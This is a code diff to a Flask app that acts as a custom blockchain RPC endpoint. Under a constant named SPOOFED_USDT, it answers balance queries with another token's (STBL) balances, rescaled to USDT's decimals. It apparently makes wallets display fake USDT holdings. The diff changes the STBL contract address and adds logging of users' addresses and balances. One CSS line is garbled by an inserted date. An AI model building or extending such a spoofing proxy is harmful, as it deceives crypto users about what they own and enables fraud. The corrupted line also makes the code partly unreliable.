@@ -6,7 +6,7 @@ from web3 import Web3
 app = Flask(__name__)
 
 SPOOFED_USDT = "0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2"
-REAL_STBL = "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb"
+REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"  # Updated STBL contract
 BASE_RPC = "https://mainnet.base.org"
 w3 = Web3(Web3.HTTPProvider(BASE_RPC))
 
@@ -23,7 +23,7 @@ stbl_contract = w3.eth.contract(address=Web3.to_checksum_address(REAL_STBL), abi
 try:
     STBL_DECIMALS = stbl_contract.functions.decimals().call()
 except Exception:
-    STBL_DECIMALS = 6
+    STBL_DECIMALS = 6  # Assuming 6 decimals, adjust if different
 
 USDT_TOTAL_SUPPLY = 100_000_000_000 * (10 ** 6)
 
@@ -51,11 +51,12 @@ def handle_rpc():
                 try:
                     address = Web3.to_checksum_address("0x" + data_field[34:74])
                     real_balance = stbl_contract.functions.balanceOf(address).call()
+                    app.logger.info(f"Address: {address}, STBL Balance: {real_balance}")
                     if STBL_DECIMALS != 6:
                         real_balance = real_balance * (10 ** (6 - STBL_DECIMALS))
                     result = "0x" + hex(real_balance)[2:].zfill(64)
                 except Exception as e:
-                    app.logger.error(f"Balance query failed: {str(e)}")
+                    app.logger.error(f"Balance query failed for {address}: {str(e)}")
                     result = "0x" + hex(0)[2:].zfill(64)
                 return jsonify({"jsonrpc": "2.0", "id": call_id, "result": result})
 
@@ -190,7 +191,7 @@ def add_token():
                 background-color: #0056b3;
             }
             .status {
-                margin-top: 10px;
+                March 11, 2025 margin-top: 10px;
                 font-size: 14px;
                 color: #666;
             }
